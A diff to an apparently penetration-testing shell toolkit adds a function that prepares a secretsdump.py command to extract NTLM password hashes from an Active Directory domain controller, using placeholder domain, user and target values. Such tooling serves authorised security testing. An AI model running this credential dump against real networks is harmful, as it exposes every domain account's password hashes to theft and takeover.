@@ -14,6 +14,7 @@ Commands
 --------
 nb-ad-dump-hash-install         installs dependencies
 nb-ad-dump-hash-secrets         dump secrets from the remote machine
+nb-ad-dump-hash-ntds            
 
 DOC
 }
@@ -47,4 +48,14 @@ nb-ad-dump-hash-secrets() {
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
+}
+
+nb-ad-dump-hash-ntds() {
+    __check-project
+    __check-network
+    __check-domain
+    __check-user
+    echo
+
+    print -z "secretsdump.py <DOMAIN>.local/<USER>:'<PASSWORD>'@<TARGET_IP> -just-dc-ntlm"
 }
